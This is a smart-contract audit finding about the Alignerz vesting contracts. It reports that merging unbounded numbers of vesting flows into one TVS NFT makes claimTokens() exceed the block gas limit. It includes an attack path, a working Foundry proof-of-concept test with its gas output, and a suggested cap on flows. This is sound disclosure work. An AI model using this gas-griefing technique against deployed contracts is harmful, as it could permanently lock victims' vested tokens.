# [001069] Unbounded TVS Flow Growth Allows Permanent Denial-of-Service (OOG) in claimTokens()
  
  ### Summary

The lack of an upper bound on the number of vesting flows attached to a single TVS NFT allows an attacker (or even a normal user unintentionally) to merge hundreds of TVSs into one, creating an NFT with an extremely large number of vesting flows.

Because claimTokens() iterates through every flow, once the number of flows becomes large enough, the function will inevitably consume more than the block gas limit and permanently revert out-of-gas. This makes the TVS forever unclaimable, resulting in permanent loss of vesting tokens.

### Root Cause

https://github.com/dualguard/2025-11-alignerz/blob/f7eeed88d91356484c02af6f38b71f27b790828c/protocol/src/contracts/vesting/AlignerzVesting.sol#L1021

https://github.com/dualguard/2025-11-alignerz/blob/f7eeed88d91356484c02af6f38b71f27b790828c/protocol/src/contracts/vesting/AlignerzVesting.sol#L1038

The above function merges one NFT into another and appends all flows from the source NFT into the target NFT. This operation has no upper bound, letting a user accumulate infinite flows (Unless the transaction revert with OOG).

https://github.com/dualguard/2025-11-alignerz/blob/f7eeed88d91356484c02af6f38b71f27b790828c/protocol/src/contracts/vesting/AlignerzVesting.sol#L953

In the above function when tokens are claimed, the function loops through every flow in the allocation:
```solidity
for (uint256 i = 0; i < allocation.amounts.length; i++) {
    // Calculates claimable seconds, updates state, etc.
}
```

Merging is cheap even with hundreds of flows in the source NFT and Claiming is expensive, and grows linearly with number of flows.
As soon as the accumulated flows exceed what can be processed in a ~30M gas block, claims always revert. This mismatch creates a denial-of-service vulnerability.

### Internal Pre-conditions

1. Multiple users must have TVS NFTs. 


### External Pre-conditions

None.


### Attack Path

1. Normal users accumulate multiple TVS NFTs over time. They may claim allocations from different pools/projects or buy TVSs from others.
2. Users merge these TVSs into a single NFT for convenience. The protocol explicitly provides mergeTVS() to simplify management.
3. User continues merging more and more NFTs into the same “main” NFT. 
4. Flow count silently grows past practical limits. Even 60–80 flows is enough to push gas toward the danger zone.
5. When the vesting period ends, the user calls claimTokens(). The function iterates over every flow inside the NFT.
6. Gas usage blows past the block limit and reverts with OOG

### Impact

A malicious actor can create a TVS NFT containing an extremely large number of vesting flows and transfer it to a victim. Because merging flows is cheap but claiming flows is expensive and unbounded, the victim will be unable to execute claimTokens() without exceeding the block gas limit. 

Even **without a malicious actor**, legitimate users can brick themselves. If users are highly bullish on a project, they may keep buying additional TVS NFTs and merge them into a single NFT for convenience. As the number of flows grows, claimTokens() eventually becomes impossible to execute due to out-of-gas reverts, permanently preventing the user from claiming any of their vested tokens.

### PoC

**Note :** Before Running this POC make sure that your `FeesManager::calculateFeeAndNewAmountForOneTVS` and `AlignerzVesting::_computeSplitArrays` looks like below. Because there already exists different issues. Those should be fixed inorder to run this test. 

```solidity
    function calculateFeeAndNewAmountForOneTVS(uint256 feeRate, uint256[] memory amounts, uint256 length) public pure returns (uint256 feeAmount, uint256[] memory newAmounts) {
        newAmounts = new uint256[](length);
        for (uint256 i; i < length;) {
            feeAmount += calculateFeeAmount(feeRate, amounts[i]);
            newAmounts[i] = amounts[i] - feeAmount;
            unchecked {
                i++;
            }
        }
    }
```

The below will be the actual POC

```solidity
//SPDX-License-Identifier: MIT
pragma solidity =0.8.29;


import {Test,console} from "forge-std/Test.sol";
import {ERC20,IERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {Aligners26} from "src/contracts/token/Aligners26.sol";
import {AlignerzVesting} from "src/contracts/vesting/AlignerzVesting.sol";
import {AlignerzNFT} from "src/contracts/nft/AlignerzNFT.sol";
import {A26ZDividendDistributor} from "src/contracts/A26ZDividendDistributor/A26ZDividendDistributor.sol";
import {MockUSD} from "src/MockUSD.sol";
import {IAlignerzVesting} from "src/interfaces/IAlignerzVesting.sol";

contract AlignerzVestingForTest is AlignerzVesting{
    function allocationof(uint256 nftId)public view returns(Allocation memory _allocation){
        _allocation =allocationOf[nftId];
    }

    function getRewardProjectsInfo(uint256 projectId)public view returns (address[] memory kolTVSAddresses, address[] memory kolStablecoinAddresses){
        kolTVSAddresses=rewardProjects[projectId].kolTVSAddresses;
        kolStablecoinAddresses=rewardProjects[projectId].kolStablecoinAddresses;
    }

    function getKOLIndexes(uint256 projectId, address KOL,bool isTvs)public returns(uint256){
        if(isTvs){
            return rewardProjects[projectId].kolTVSIndexOf[KOL];
        }
        return rewardProjects[projectId].kolStablecoinIndexOf[KOL];
    }

    function getTotalTokens(uint256 nftId)public view returns(uint256 amount){
        uint256 len =allocationOf[nftId].amounts.length;
        for(uint256 i=0;i<len;i++){
            amount+=allocationOf[nftId].amounts[i];
        }
    } 

    function getTotalTokens(uint256 projectId,uint256 nftId,bool isBiddingProject)public view returns(uint256 amount){
        Allocation memory alloc;
        if(isBiddingProject){
            alloc=biddingProjects[projectId].allocations[nftId];
        }else{
            alloc=rewardProjects[projectId].allocations[nftId];
        }
        uint256 len=alloc.amounts.length;
        for(uint256 i=0;i<len;i++){
            amount+=alloc.amounts[i];
        }
    } 
}
contract TestAlignerzVesting is Test {

    MockUSD public USD;
    Aligners26 public project1;
    Aligners26 public project2;
    AlignerzVestingForTest public vesting;
    AlignerzNFT public nft;
    A26ZDividendDistributor public dividendDistributorProject1;
    mapping(address=>string) addressToKOL;
    address OWNER=makeAddr("OWNER");
    address USER1=makeAddr("USER1");
    address USER2=makeAddr("USER2");
    address USER3=makeAddr("USER3");
    address USER4=makeAddr("USER4");
    address USER5=makeAddr("USER5");
    address USER6=makeAddr("USER6");
    function setUp()public{
        addressToKOL[USER1]="USER1";
        addressToKOL[USER2]="USER2";
        addressToKOL[USER3]="USER3";

        startHoax(OWNER);
        USD=new MockUSD();
        project1=new Aligners26("PROJECT-1","PROJECT-1");
        project2=new Aligners26("PROJECT-2","PROJECT-2");
        vesting = new AlignerzVestingForTest();
        nft=new AlignerzNFT("Aligner-NFT","NFT","NO-URI");
        vesting.initialize(address(nft));
        nft.addMinter(address(vesting));
        vm.stopPrank();
    }

    //@note Iam taking reward projects for making the tests simpler
    function createProjectsAndSetAllocation(uint256 vestingPeriod,uint256 _totalTVSAllocation,address[] memory KOLS)internal{
        startHoax(OWNER);
        project1.approve(address(vesting), type(uint256).max);
        uint256 startTime=block.timestamp+10;
        uint256 claimWindow=block.timestamp+110;
        vesting.launchRewardProject(address(project1), address(USD), startTime, claimWindow);
        
        
        uint256 tvsAllocationPerAddress=_totalTVSAllocation/KOLS.length;
        uint256 totalTVSAllocation;
        uint256[] memory TVSamounts=new uint256[](KOLS.length);
        for(uint8 i=0; i<KOLS.length;i++){
            TVSamounts[i]=tvsAllocationPerAddress;
            totalTVSAllocation+=tvsAllocationPerAddress;
        }
        vesting.setTVSAllocation(0, totalTVSAllocation, vestingPeriod, KOLS, TVSamounts);
        vm.stopPrank();
    }
    
    function test_Gas_Consumed_For_Merging_And_ClaimTokens_After_Many_Mergings()public{
        //Adding more number of flows for a token.
        address USER;
        uint256 numberOfTVS=105;
        uint256 vestingPeriod=100;
        uint256 totalTVSAllocation = 9000e18;
        uint256 rewardProjectId=0;
        address[] memory KOLS=new address[](numberOfTVS);
        console.log("HERE");
        for(uint256 i=0; i<numberOfTVS;i++){
            USER=address(bytes20((keccak256(abi.encode(i)))));
            KOLS[i]=USER;
        }
        console.log("HERE");
        createProjectsAndSetAllocation(vestingPeriod,totalTVSAllocation,KOLS);
        uint256[] memory mergeProjectIds=new uint256[](numberOfTVS-1);
        uint256[] memory mergeNftIds=new uint256[](numberOfTVS-1);
        console.log("HERE");
        uint256 startNftId=1; // Since tokenId 1 is minted for USER1;

        uint256 currentNftId=startNftId;
        for(uint256 i=0; i<numberOfTVS;i++){
            USER=address(bytes20((keccak256(abi.encode(i)))));
            startHoax(USER);
            vesting.claimRewardTVS(rewardProjectId);
            nft.transferFrom(USER, USER1, currentNftId);
            if(currentNftId>1){
                mergeProjectIds[i-1]=0;
                mergeNftIds[i-1]=currentNftId;
            }

            currentNftId++;
            vm.stopPrank();
        }
        hoax(OWNER);
        vesting.setTreasury(address(1));

        hoax(USER1);
        vesting.mergeTVS(rewardProjectId, startNftId, mergeProjectIds, mergeNftIds);

        /////////////////////////////////////////////
        //The above proces will add around 106 flows to nft id
        //After the above proces is done a single flow is added to check how much would it cost in terms of gas to 
        // compare it with gas compared in claimtokens. If adding a single flow to a token uses more amount of gas 
        // than claim tokens that means no issue because it will rever the OOG while ading the flow itself. Since those
        //are not added the user cal claim the flows seperately.



        // Creating a new single allocation;
        address[] memory KOLS_NEW=new address[](1);
        uint256[] memory KOL_TVS_NEW=new uint256[](1);
        KOLS_NEW[0]=USER1;
        KOL_TVS_NEW[0]=totalTVSAllocation;

        hoax(OWNER);
        vesting.setTVSAllocation(rewardProjectId, totalTVSAllocation, vestingPeriod, KOLS_NEW, KOL_TVS_NEW);

        startHoax(USER1);
        vesting.claimRewardTVS(rewardProjectId);

        uint256[] memory mergeProjectIdsNew=new uint256[](1);
        uint256[] memory mergeNftIdsNew=new uint256[](1);

        mergeProjectIdsNew[0]=rewardProjectId;
        mergeNftIdsNew[0]=currentNftId;
        currentNftId++;

        uint256 gasleftBeforeMerge=gasleft();
        vesting.mergeTVS(rewardProjectId, startNftId, mergeProjectIdsNew, mergeNftIdsNew);
        uint256 gasleftAfterMerge=gasleft();
        ////////////END OF ADDING SINGLE ALLOCATION //////////////

        ///////////TRYING TO CLAIM TOKENS AFTER VESTING PERIOD////////////
        vm.warp(block.timestamp+200);
        uint256 gasleftBeforeClaim=gasleft();
        //vm.expectRevert(); 
        vesting.claimTokens(rewardProjectId, startNftId);
        uint256 gasleftAfterClaim=gasleft();

        uint256 totalGasConsumedInMerge=gasleftBeforeMerge-gasleftAfterMerge;
        uint256 totalGasConsumedInclaim=gasleftBeforeClaim-gasleftAfterClaim;

        require(totalGasConsumedInMerge <=750000 /* 7.5 Lakhs */,"Merge is Consuming Long Amounts of gas");
        require(totalGasConsumedInclaim >=30000000 /*30 million */,"Not Consumed the block Gas Limit");

        console.log("GAS CONSUMED IN MERGE FOR ADDING A SINGLE FLOW           :",totalGasConsumedInMerge);
        console.log("GAS CONSUMED IN CLAIM TOKENS AFTER ADDING THAT LAST FLOW :",totalGasConsumedInclaim);
    }


}
```

1. Add the above test in `test/vesting/TestAlignerzVesting.t.sol`
2. Run the following command in terminal.
```bash
forge test --mt test_Gas_Consumed_For_Merging_And_ClaimTokens_After_Many_Mergings -vv
```
3. You will see the output something simillar to below
```bash
Ran 1 test for test/vesting/TestAlignerzVesting.t.sol:TestAlignerzVesting
[PASS] test_Gas_Consumed_For_Merging_And_ClaimTokens_After_Many_Mergings() (gas: 104265537)
Logs:
  HERE
  HERE
  HERE
  GAS CONSUMED IN MERGE FOR ADDING A SINGLE FLOW           : 707974
  GAS CONSUMED IN CLAIM TOKENS AFTER ADDING THAT LAST FLOW : 31516584

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 102.78ms (100.74ms CPU time)
```

### Mitigation

Restrict the number of flows to maybe 10 or 15.

  